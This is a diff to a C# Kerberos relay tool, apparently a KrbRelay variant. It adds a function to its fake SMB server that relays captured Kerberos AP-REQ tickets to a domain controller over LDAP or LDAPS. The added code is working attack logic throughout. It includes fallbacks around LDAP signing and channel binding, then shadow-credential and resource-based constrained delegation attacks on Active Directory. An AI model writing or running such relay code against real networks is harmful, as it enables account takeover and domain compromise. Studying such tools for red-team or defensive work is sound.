@@ -261,6 +261,207 @@ public class FakeSMBServer
         }
     }
 
+    /// <summary>
+    /// Relays the captured AP-REQ to the target domain controller over LDAP (389) or LDAPS (636 with -ssl).
+    /// With -reauth a base simple bind with the supplied low privileged account is performed first and the
+    /// reflected ticket is then sent as an RFC 4513 re-authentication on that same connection.
+    /// </summary>
+    private static void RelayToLdap(byte[] apreqBuffer)
+    {
+        byte[] apreq = apreqBuffer;
+        int port = Program.useSSL ? 636 : 389;
+
+        Task.Run(() =>
+        {
+            using (KrbRelay.Clients.LdapRelayClient ldap = new KrbRelay.Clients.LdapRelayClient())
+            {
+                ldap.Trace = Program.ldapDebug;
+                if (!ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string error))
+                {
+                    Console.WriteLine("[-] ldap: cannot connect to [{0}:{1}]: {2}", Program.RedirectHost, port, error);
+                    return;
+                }
+                Console.WriteLine("[*] ldap: connected to [{0}:{1}]{2}", Program.RedirectHost, port, Program.useSSL ? " over TLS" : "");
+
+                if (Program.ldapStartTls && !ldap.IsTls)
+                {
+                    if (!ldap.StartTls(out string startTlsError))
+                    {
+                        Console.WriteLine("[-] ldap: StartTLS failed: {0}", startTlsError);
+                        return;
+                    }
+                    Console.WriteLine("[+] ldap: StartTLS established, binding over TLS");
+                }
+
+                // The captured ticket is only usable against the service it was issued for.
+                if (KrbRelay.Clients.KerberosApReq.TryGetServiceName(apreq, out string ticketService, out string ticketRealm))
+                {
+                    Console.WriteLine("[*] ldap: relayed ticket is for {0}@{1}", ticketService, ticketRealm);
+                    string ticketSvc = ticketService.Split('/')[0];
+                    if (!ticketSvc.Equals("ldap", StringComparison.OrdinalIgnoreCase))
+                    {
+                        Console.WriteLine("[!] ldap: ticket service is '{0}', not 'ldap' - the DC will reject it unless that SPN maps to the same account", ticketSvc);
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("[!] ldap: could not decode the AP-REQ service name ({0} bytes), head={1}",
+                        apreq.Length, BitConverter.ToString(apreq, 0, Math.Min(48, apreq.Length)).Replace("-", "").ToLowerInvariant());
+                }
+
+                int result;
+                string diagnostic;
+
+                if (Program.reauth)
+                {
+                    result = ldap.BindSimple(Program.reauthDomain, Program.reauthUser, Program.reauthPassword, out diagnostic);
+
+                    // The DC enforces LDAP signing: a simple bind needs integrity on the wire. Retry once
+                    // over StartTLS on the same port (or use -ssl for LDAPS 636).
+                    if ((result == 8 || result == 53) && !ldap.IsTls)
+                    {
+                        Console.WriteLine("[*] ldap: signing required on plaintext 389 (strongAuthRequired), negotiating StartTLS");
+                        if (ldap.StartTls(out string tlsError))
+                        {
+                            Console.WriteLine("[+] ldap: StartTLS established, retrying base bind");
+                            result = ldap.BindSimple(Program.reauthDomain, Program.reauthUser, Program.reauthPassword, out diagnostic);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[-] ldap: StartTLS failed: {0}", tlsError);
+                        }
+                    }
+
+                    if (result != 0)
+                    {
+                        Console.WriteLine("[-] ldap: base bind as {0}\\{1} failed: {2} ({3}) {4}",
+                            Program.reauthDomain, Program.reauthUser, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+                        if (result == 8 || result == 53)
+                        {
+                            Console.WriteLine("[-] ldap: this DC requires integrity on the bind, use -ssl (LDAPS 636) or ensure StartTLS is allowed");
+                        }
+                        return;
+                    }
+                    Console.WriteLine("[+] ldap: base bind as {0}\\{1} established, sending re-authentication",
+                        Program.reauthDomain, Program.reauthUser);
+
+                    result = ldap.BindSaslGssApi(apreq, out diagnostic);
+                    Console.WriteLine("[*] ldap: re-authentication ({0}) result: {1} ({2}) {3}",
+                        ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+
+                    // AD may refuse to switch from a simple bind to a SASL bind in place (Notice of Disconnection).
+                    // The base bind has already served its purpose, so retry the ticket bind on a fresh connection.
+                    if (result != 0)
+                    {
+                        Console.WriteLine("[!] ldap: in-place re-authentication refused, retrying the ticket bind on a fresh connection");
+                        ldap.Dispose();
+                        if (ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string reconnectError))
+                        {
+                            result = ldap.BindSaslGssApi(apreq, out diagnostic);
+                            Console.WriteLine("[*] ldap: relayed bind on a fresh connection ({0}) result: {1} ({2}) {3}",
+                                ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[-] ldap: reconnect failed: {0}", reconnectError);
+                        }
+                    }
+                }
+                else
+                {
+                    result = ldap.BindSaslGssApi(apreq, out diagnostic);
+                    Console.WriteLine("[*] ldap: relayed bind ({0}) result: {1} ({2}) {3}",
+                        ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+
+                    // Some DCs only accept the "GSSAPI" SASL mechanism. It expects the GSS-API Kerberos token
+                    // (the SPNEGO mechToken, 0x60 ... OID ... AP-REQ), not a bare AP-REQ.
+                    if (result != 0 && KrbRelay.Clients.KerberosApReq.TryExtractGssToken(apreq, out byte[] gssToken))
+                    {
+                        Console.WriteLine("[!] ldap: retrying with the GSS-API Kerberos token (SASL mechanism GSSAPI)");
+                        ldap.Dispose();
+                        if (ldap.Connect(Program.RedirectHost, port, Program.useSSL, out string retryError))
+                        {
+                            result = ldap.BindSaslGssApi(gssToken, "GSSAPI", out diagnostic);
+                            Console.WriteLine("[*] ldap: GSSAPI bind ({0}) result: {1} ({2}) {3}",
+                                ldap.Mechanism, KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[-] ldap: reconnect failed: {0}", retryError);
+                        }
+                    }
+                }
+
+                if (result != 0)
+                {
+                    Console.WriteLine("[-] ldap: bind refused: {0} ({1}) {2}",
+                        KrbRelay.Clients.LdapRelayClient.ResultText(result), result, diagnostic);
+
+                    if (diagnostic.Contains("80090346") || diagnostic.Contains("8009034"))
+                    {
+                        Console.WriteLine("[-] ldap: channel binding (EPA) mismatch - the DC requires the TLS channel binding");
+                        Console.WriteLine("[-] ldap: inside the ticket, which a relayed AP-REQ cannot carry. Retry WITHOUT -ssl/-ldapstarttls.");
+                    }
+                    else if (diagnostic.Contains("80090308"))
+                    {
+                        Console.WriteLine("[-] ldap: invalid GSS token for this SASL mechanism");
+                    }
+                    else if (result == 49)
+                    {
+                        Console.WriteLine("[-] ldap: the ticket was refused; it must map to the DC's machine account (ldap/<dc>)");
+                    }
+                    return;
+                }
+
+                // Short timeout: if the DC stops answering after the bind there is nothing to wait for.
+                ldap.SetReceiveTimeout(5000);
+
+                string who = ldap.WhoAmI(out int whoResult, out string whoDiagnostic);
+                if (who != null)
+                {
+                    Console.WriteLine("[+] ldap: authenticated as {0}", who);
+                }
+                else
+                {
+                    Console.WriteLine("[!] ldap: whoami failed: {0} ({1}) {2}",
+                        KrbRelay.Clients.LdapRelayClient.ResultText(whoResult), whoResult, whoDiagnostic);
+                    if (whoResult == -1)
+                    {
+                        Console.WriteLine("[!] ldap: the DC accepted the bind but does not answer further operations on this connection");
+                        Console.WriteLine("[!] ldap: capture the frames after the bind - if the DC replied, the client is mis-framing them");
+                    }
+                }
+
+                if (!Program.attacks.ContainsKey("rbcd") && !Program.attacks.ContainsKey("shadowcred"))
+                {
+                    return;
+                }
+
+                string namingContext = ldap.GetDefaultNamingContext(out int namingResult, out string namingDiagnostic);
+                if (namingContext == null)
+                {
+                    Console.WriteLine("[!] ldap: could not read defaultNamingContext ({0}) {1}, falling back to {2}",
+                        KrbRelay.Clients.LdapRelayClient.ResultText(namingResult), namingDiagnostic, Program.domainDN);
+                    namingContext = Program.domainDN;
+                }
+                else
+                {
+                    Console.WriteLine("[*] ldap: naming context {0}", namingContext);
+                }
+
+                if (Program.attacks.ContainsKey("shadowcred"))
+                {
+                    KrbRelay.Clients.Attacks.Ldap.ShadowCredentialAttack.Attack(ldap, namingContext, Program.attacks["shadowcred"]);
+                }
+
+                if (Program.attacks.ContainsKey("rbcd"))
+                {
+                    KrbRelay.Clients.Attacks.Ldap.RbcdAttack.Attack(ldap, namingContext, Program.attacks["rbcd"], Program.attacks["rbcdsid"]);
+                }
+            }
+        });
+    }
+
     private void OnClientConnect(IAsyncResult ar)
     {
         try
@@ -390,6 +591,13 @@ public class FakeSMBServer
                             //CloseConnection(state);
                             //return;
                         }
+                    }
+                    if (Program.service == "ldap")
+                    {
+                        RelayToLdap(Program.apreqBuffer);
+                        state.isRelayed = false;
+                        CloseConnection(state);
+                        return;
                     }
                     if (Program.service == "http")
                     {
@@ -580,6 +788,13 @@ public class FakeSMBServer
                             //CloseConnection(state);
                             //return;
                         }
+                    }
+                    if (Program.service == "ldap")
+                    {
+                        RelayToLdap(Program.apreqBuffer);
+                        state.isRelayed = false;
+                        CloseConnection(state);
+                        return;
                     }
                     if (Program.service == "http")
                     {
